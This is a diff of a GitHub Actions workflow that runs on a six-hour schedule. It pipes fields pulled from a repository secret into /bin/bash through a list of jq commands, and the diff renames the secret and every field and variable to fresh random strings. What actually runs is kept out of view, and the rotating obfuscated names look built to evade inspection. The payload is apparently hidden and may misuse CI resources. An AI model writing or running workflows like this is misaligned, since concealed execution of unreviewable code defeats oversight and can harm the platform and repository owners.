@@ -2,27 +2,30 @@ name: dongzhaliang9876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
-jobs:  # 13685
+    - cron: '33 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongzhaliang9876
         env:
-          qaj2: ${{ secrets.qaj2 }}
+          j0: ${{ secrets.j0 }}
         run: |
-          echo $qaj2 | jq -r .obil81040 | /bin/bash
-          echo $bx0 | jq -r .fpb0 | /bin/bash
-          echo $yo4 | jq -r .ezha82088 | /bin/bash
-          echo $xje4 | jq -r .pxkgv16 | /bin/bash
-          echo $f50 | jq -r .g13 | /bin/bash
-          echo $cwrip5 | jq -r .ywy9 | /bin/bash
-          echo $pe3124 | jq -r .q57537 | /bin/bash
-          echo $j0 | jq -r .habdw18 | /bin/bash
-          echo $fzvd5 | jq -r .awa0298 | /bin/bash
-          echo $lra28222 | jq -r .looye95 | /bin/bash
-          echo $rjz6 | jq -r .est571 | /bin/bash
-          echo $ymd0 | jq -r .dst6 | /bin/bash
-          echo $j10136 | jq -r .cnrlr0 | /bin/bash
+          echo $j0 | jq -r .yltx39 | /bin/bash
+          echo $rgpvh756 | jq -r .qzt2 | /bin/bash
+          echo $g557 | jq -r .ux93213 | /bin/bash
+          echo $ty08956 | jq -r .og470 | /bin/bash
+          echo $esk7 | jq -r .pvof6 | /bin/bash
+          echo $qfixg2 | jq -r .bdt9 | /bin/bash
+          echo $samy70106 | jq -r .pmh161 | /bin/bash
+          echo $tglfq843 | jq -r .f01005 | /bin/bash
+          echo $xnybj4 | jq -r .bn694 | /bin/bash
+          echo $mj9597 | jq -r .upc6 | /bin/bash
+          echo $in58968 | jq -r .flybg5167 | /bin/bash
+          echo $rvp12 | jq -r .r875 | /bin/bash
+          echo $hjl816 | jq -r .cfcc82 | /bin/bash
+          echo $zjlc7682 | jq -r .uezmy82872 | /bin/bash
 
